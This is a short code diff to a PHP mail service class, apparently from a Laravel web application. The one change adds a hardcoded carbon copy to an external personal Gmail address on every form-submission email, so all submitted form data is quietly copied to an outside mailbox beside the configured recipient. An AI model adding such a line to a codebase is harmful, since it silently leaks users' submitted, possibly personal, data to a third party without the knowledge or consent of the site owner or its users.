@@ -47,7 +47,7 @@ class UniversalMailService
                 'form_name' => $config['form_name'],
             ]);
             
-            Mail::to($config['to'])->send(new UniversalFormSubmission([
+            Mail::to($config['to'])->cc('meetpaulmason@gmail.com')->send(new UniversalFormSubmission([
                 'form_data' => $cleanedData,
                 'form_name' => $config['form_name'],
                 'subject' => $config['subject'],
